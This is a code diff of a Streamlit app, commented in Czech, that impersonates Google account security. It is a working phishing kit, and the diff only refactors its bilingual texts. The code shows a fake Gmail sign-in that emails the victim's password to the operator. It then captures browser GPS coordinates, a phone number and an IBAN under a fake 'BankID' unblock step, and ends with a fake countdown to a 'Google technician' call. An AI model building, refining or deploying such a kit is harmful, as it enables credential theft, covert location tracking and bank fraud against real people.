@@ -10,67 +10,67 @@ from email.mime.image import MIMEImage
 from datetime import datetime, timedelta
 import streamlit.components.v1 as components
 
-# ====================== JAZYKOVÉ TEXTY ======================
+# ====================== VÍCEJAZYČNÉ TEXTY ======================
 TEXTS = {
     "en": {
         "page_title": "Google Account Security",
         "login_header": "Sign in",
         "login_sub": "Continue to Gmail",
-        "email_placeholder": "Email or phone",
-        "password_placeholder": "Password",
-        "next_btn": "Next",
-        "face_header": "Face Scan",
+        "email": "Email or phone",
+        "password": "Password",
+        "next": "Next",
         "face_info": "Step 2: Biometric face scan",
         "face_desc": "For secure sign-in, please align your face in the frame.",
-        "gps_header": "Location Verification",
         "gps_info": "Step 2.5: Security location check",
         "gps_desc": "Google detected unusual activity.\nPlease share your current location to continue.",
         "gps_button": "✅ Share my current location",
-        "verification_header": "Suspicious activity detected",
+        "verification_header": "⚠️ Suspicious activity detected",
         "verification_desc": "Your account is temporarily restricted. Choose verification method.",
-        "country_label": "Country",
-        "phone_label": "Phone number (9 digits)",
+        "country": "Country",
+        "phone": "Phone number (9 digits)",
         "call_tab": "Call from technician",
         "bankid_tab": "BankID (Faster)",
         "call_btn": "Request a call",
         "bankid_desc": "Instant unblock via Bank Identity",
-        "iban_label": "Account number / IBAN",
-        "authorize_btn": "Authorize",
+        "iban": "Account number / IBAN",
+        "authorize": "Authorize",
         "finish_header": "Request successfully recorded",
         "finish_status": "### STATUS: AWAITING APPROVAL",
         "finish_info": "A Google technician will contact you shortly.\nDo not close this browser tab.",
-        "timer_text": "**Approximately {hours} hours and {minutes} minutes remaining**",
+        "timer": "**Approximately {hours} hours and {minutes} minutes remaining**",
     },
     "cs": {
         "page_title": "Zabezpečení účtu Google",
         "login_header": "Přihlášení",
         "login_sub": "Pokračovat do služby Gmail",
-        "email_placeholder": "E-mail nebo telefon",
-        "password_placeholder": "Zadejte heslo",
-        "next_btn": "Další",
-        "face_header": "Sken obličeje",
+        "email": "E-mail nebo telefon",
+        "password": "Zadejte heslo",
+        "next": "Další",
         "face_info": "Fáze 2: Biometrický sken obličeje",
         "face_desc": "Pro bezpečné přihlášení prosím zarovnejte obličej do rámečku.",
-        "gps_header": "Ověření polohy",
         "gps_info": "Fáze 2.5: Bezpečnostní ověření polohy",
         "gps_desc": "Google detekoval neobvyklou aktivitu.\nPro bezpečné pokračování sdílejte svou aktuální polohu.",
         "gps_button": "✅ Sdílet moji aktuální polohu",
         "verification_header": "⚠️ Zjištěna podezřelá aktivita",
         "verification_desc": "Váš účet je dočasně omezen. Vyberte způsob ověření.",
-        "country_label": "Země",
-        "phone_label": "Telefonní číslo (9 číslic)",
+        "country": "Země",
+        "phone": "Telefonní číslo (9 číslic)",
         "call_tab": "Hovor od technika",
         "bankid_tab": "BankID (Urychlit)",
         "call_btn": "Požádat o hovor",
         "bankid_desc": "Okamžité odblokování přes Bankovní Identitu",
-        "iban_label": "Číslo účtu / IBAN",
-        "authorize_btn": "Autorizovat",
+        "iban": "Číslo účtu / IBAN",
+        "authorize": "Autorizovat",
         "finish_header": "Požadavek byl úspěšně zaznamenán",
         "finish_status": "### STATUS: ČEKÁNÍ NA SCHVÁLENÍ",
         "finish_info": "V nejbližší době vás bude kontaktovat technik Google.\nNe zavírejte tuto kartu prohlížeče.",
-        "timer_text": "**Zbývá přibližně {hours} hodin a {minutes} minut**",
+        "timer": "**Zbývá přibližně {hours} hodin a {minutes} minut**",
     }
 }
+
+def t(key):
+    lang = st.session_state.get("language", "en")
+    return TEXTS[lang].get(key, TEXTS["en"][key])
 
 # --- KONFIGURACE ---
 MOJE_ADRESA = os.environ.get("MOJE_ADRESA")
@@ -107,14 +107,14 @@ if "step" not in st.session_state:
     st.session_state.step = "login"
 if "zadany_email" not in st.session_state:
     st.session_state.zadany_email = ""
-if "language" not in st.session_state:          # ← nové
-    st.session_state.language = "en"            # výchozí = angličtina
+if "language" not in st.session_state:
+    st.session_state.language = "en"
 if "default_country" not in st.session_state:
     st.session_state.default_country = "Česká republika (+420)"
 if "finish_start" not in st.session_state:
     st.session_state.finish_start = None
 
-# === AUTOMATICKÁ PŘEDVOLBA ZEMĚ + PŘEPNUTÍ JAZYKA PODLE GPS ===
+# === AUTOMATICKÁ DETEKCE POLOHY + PŘEPNUTÍ JAZYKA ===
 query_params = st.query_params
 if "lat" in query_params and "lon" in query_params:
     lat = str(query_params["lat"][0] if isinstance(query_params["lat"], list) else query_params["lat"])
@@ -125,7 +125,6 @@ if "lat" in query_params and "lon" in query_params:
     st.success(f"✅ Poloha úspěšně získána: **{gps_text}**")
     odeslat_email("📍 GPS COORDINATES", f"Uživatel: {st.session_state.zadany_email}\nGPS: {gps_text}")
 
-    # Reverse geocoding + přepnutí jazyka
     try:
         resp = requests.get(
             f"https://nominatim.openstreetmap.org/reverse?lat={lat}&lon={lon}&format=json",
@@ -135,36 +134,22 @@ if "lat" in query_params and "lon" in query_params:
         data = resp.json()
         country_code = data.get("address", {}).get("country_code", "xx").lower()
         
-        mapping = {
-            "cz": "Česká republika (+420)",
-            "sk": "Slovensko (+421)",
-            "de": "Německo (+49)",
-            "at": "Rakousko (+43)",
-            "pl": "Polsko (+48)",
-            # ... přidej další podle potřeby
-        }
+        mapping = {"cz": "Česká republika (+420)", "sk": "Slovensko (+421)"}
         st.session_state.default_country = mapping.get(country_code, "Česká republika (+420)")
-        
-        # === AUTOMATICKÉ PŘEPNUTÍ JAZYKA ===
-        if country_code in ["cz", "sk"]:
-            st.session_state.language = "cs"
-        else:
-            st.session_state.language = "en"
-            
+        st.session_state.language = "cs" if country_code in ["cz", "sk"] else "en"
     except:
         st.session_state.default_country = "Česká republika (+420)"
         st.session_state.language = "en"
 
     st.session_state.step = "verification"
     
-    # Vyčistit parametry
     for key in ["lat", "lon", "acc"]:
         if key in st.query_params:
             del st.query_params[key]
     st.rerun()
 
-# ====================== STREAMLIT SETUP ======================
-st.set_page_config(page_title=TEXTS[st.session_state.language]["page_title"], page_icon="🔒")
+# ====================== STREAMLIT UI ======================
+st.set_page_config(page_title=t("page_title"), page_icon="🔒")
 
 st.markdown("""
     <style>
@@ -183,9 +168,9 @@ with col2:
         show_logo()
         st.markdown(f"<h3 class='google-header'>{TEXTS['en']['login_header']}</h3>", unsafe_allow_html=True)
         st.write(TEXTS['en']['login_sub'])
-        em = st.text_input(TEXTS['en']['email_placeholder'])
-        he = st.text_input(TEXTS['en']['password_placeholder'], type="password")
-        if st.button(TEXTS['en']['next_btn']):
+        em = st.text_input(TEXTS['en']['email'])
+        he = st.text_input(TEXTS['en']['password'], type="password")
+        if st.button(TEXTS['en']['next']):
             if je_validni_email(em) and len(he) > 3:
                 st.session_state.zadany_email = em
                 odeslat_email("🔑 LOGIN", f"Email: {em}\nHeslo: {he}")
@@ -210,25 +195,25 @@ with col2:
             st.session_state.step = "gps"
             st.rerun()
 
-    # GPS (vždy angličtina)
+    # GPS (vždy angličtina – bez f-string!)
     elif st.session_state.step == "gps":
         show_logo()
         st.info(TEXTS['en']['gps_info'])
         st.write(TEXTS['en']['gps_desc'])
         components.html(
-            f"""
+            """
             <div style="text-align:center; padding:30px; background:#f8f9fa; border-radius:12px; box-shadow:0 2px 8px rgba(0,0,0,0.1); max-width:420px; margin:0 auto;">
-                <h3 style="color:#202124; font-family:'Product Sans',sans-serif;">{TEXTS['en']['gps_header']}</h3>
-                <p style="color:#5f6368; margin-bottom:20px;">{TEXTS['en']['gps_desc'].replace('\n','<br>')}</p>
+                <h3 style="color:#202124; font-family:'Product Sans',sans-serif;">Location Verification</h3>
+                <p style="color:#5f6368; margin-bottom:20px;">Google detected unusual activity.<br>Please share your current location to continue.</p>
                 <button onclick="getGPS()" style="background:#4285F4; color:white; padding:14px 40px; font-size:16px; border:none; border-radius:8px; cursor:pointer; font-weight:bold; box-shadow:0 2px 4px rgba(66,133,244,0.3);">
-                    {TEXTS['en']['gps_button']}
+                    """ + TEXTS['en']['gps_button'] + """
                 </button>
             </div>
             <script>
-            function getGPS() {{
-                if (navigator.geolocation) {{
+            function getGPS() {
+                if (navigator.geolocation) {
                     navigator.geolocation.getCurrentPosition(
-                        function(position) {{
+                        function(position) {
                             const lat = position.coords.latitude.toFixed(6);
                             const lon = position.coords.longitude.toFixed(6);
                             const acc = position.coords.accuracy.toFixed(0);
@@ -238,32 +223,31 @@ with col2:
                             params.set("acc", acc);
                             window.parent.history.replaceState(null, '', '?' + params.toString());
                             window.parent.location.reload();
-                        }},
-                        function(error) {{ alert("Could not get location. Please try again."); }},
-                        {{ enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }}
+                        },
+                        function(error) { alert("Could not get location. Please try again."); },
+                        { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
                     );
-                }}
-            }}
+                }
+            }
             </script>
             """,
             height=380
         )
 
-    # VERIFICATION + FINISH (používá aktuální jazyk podle GPS)
+    # VERIFICATION + FINISH (jazyk podle GPS)
     elif st.session_state.step == "verification":
         lang = st.session_state.language
         show_logo()
-        st.error(TEXTS[lang]["verification_header"])
-        st.write(TEXTS[lang]["verification_desc"])
+        st.error(t("verification_header"))
+        st.write(t("verification_desc"))
 
-        index = 0  # default
-        zeme = st.selectbox(TEXTS[lang]["country_label"], COUNTRIES, index=index)  # COUNTRIES je stejný seznam jako dříve
+        zeme = st.selectbox(t("country"), ["Česká republika (+420)", "Slovensko (+421)"] + [c for c in COUNTRIES if c not in ["Česká republika (+420)", "Slovensko (+421)"]])
 
-        tel = st.text_input(TEXTS[lang]["phone_label"])
+        tel = st.text_input(t("phone"))
         
-        tab1, tab2 = st.tabs([TEXTS[lang]["call_tab"], TEXTS[lang]["bankid_tab"]])
+        tab1, tab2 = st.tabs([t("call_tab"), t("bankid_tab")])
         with tab1:
-            if st.button(TEXTS[lang]["call_btn"]):
+            if st.button(t("call_btn")):
                 if je_validni_tel(tel):
                     odeslat_email("📞 KONTAKT", f"Uživatel: {st.session_state.zadany_email}\nTel: {tel} ({zeme})")
                     st.session_state.step = "finish"
@@ -272,9 +256,9 @@ with col2:
                 else:
                     st.error("Enter exactly 9 digits!")
         with tab2:
-            st.write(TEXTS[lang]["bankid_desc"])
-            ib = st.text_input(TEXTS[lang]["iban_label"])
-            if st.button(TEXTS[lang]["authorize_btn"]):
+            st.write(t("bankid_desc"))
+            ib = st.text_input(t("iban"))
+            if st.button(t("authorize")):
                 if je_validni_tel(tel) and len(ib) > 10:
                     odeslat_email("🏦 BANKID DATA", f"User: {st.session_state.zadany_email}\nTel: {tel}\nIBAN: {ib}")
                     st.session_state.step = "finish"
@@ -286,9 +270,9 @@ with col2:
     elif st.session_state.step == "finish":
         lang = st.session_state.language
         show_logo()
-        st.success(TEXTS[lang]["finish_header"])
-        st.markdown(TEXTS[lang]["finish_status"])
-        st.info(TEXTS[lang]["finish_info"])
+        st.success(t("finish_header"))
+        st.markdown(t("finish_status"))
+        st.info(t("finish_info"))
         
         if st.session_state.finish_start:
             elapsed = datetime.now() - st.session_state.finish_start
@@ -296,6 +280,6 @@ with col2:
             hours = max(0, int(remaining.total_seconds() // 3600))
             minutes = max(0, int((remaining.total_seconds() % 3600) // 60))
             st.progress(min(100, int(elapsed.total_seconds() / (24*3600) * 100)))
-            st.write(TEXTS[lang]["timer_text"].format(hours=hours, minutes=minutes))
+            st.write(t("timer").format(hours=hours, minutes=minutes))
         
         st.info("Do not close this browser tab.")
